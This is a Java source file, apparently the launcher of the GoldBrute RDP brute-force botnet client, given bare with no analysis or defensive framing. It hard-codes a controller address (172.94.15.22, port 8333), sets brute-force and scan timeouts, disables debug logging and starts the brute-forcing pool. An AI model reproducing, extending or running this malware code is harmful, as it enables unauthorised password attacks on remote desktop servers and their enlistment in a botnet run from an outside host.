package rdp.gold.brute.version;

import java.io.StringWriter;
import org.apache.log4j.Logger;
import rdp.gold.brute.Config;
import rdp.gold.brute.pool.GoldBrute;

public class Console {
    private static final Logger logger = Logger.getLogger(Console.class);

    public void run(String[] args) {
        try {
            Config.runAutoconfigureThreads();
            Config.HOST_ADMIN = "172.94.15.22";
            Config.PORT_ADMIN = 8333;

            Config.BRUTE_TIMEOUT = Integer.valueOf(11000);
            Config.SCAN_CONNECT_TIMEOUT = Integer.valueOf(2000);
            Config.SCAN_SOCKET_TIMEOUT = Integer.valueOf(2000);

            Config.BRUTE_TIMEOUT_MS_SETTINGS_FILE = Integer.valueOf(5000);
            Config.SCAN_CONNECT_TIMEOUT_MS_SETTINGS_FILE = Integer.valueOf(1000);
            Config.SCAN_SOCKET_TIMEOUT_MS_SETTINGS_FILE = Integer.valueOf(1000);

            Config.IS_ENABLE_DEBUG = Boolean.valueOf(false);
            Config.LOG_PATH = "";

            Config.init();

            GoldBrute goldBrute = new GoldBrute();
            goldBrute.start();
        } catch (Exception e) {
            StringWriter sw = new StringWriter();
            e.printStackTrace(new java.io.PrintWriter(sw));
            logger.error(e + " " + sw);
            System.err.println(e.getMessage());
            e.printStackTrace();

            System.exit(0);
        }
    }
}
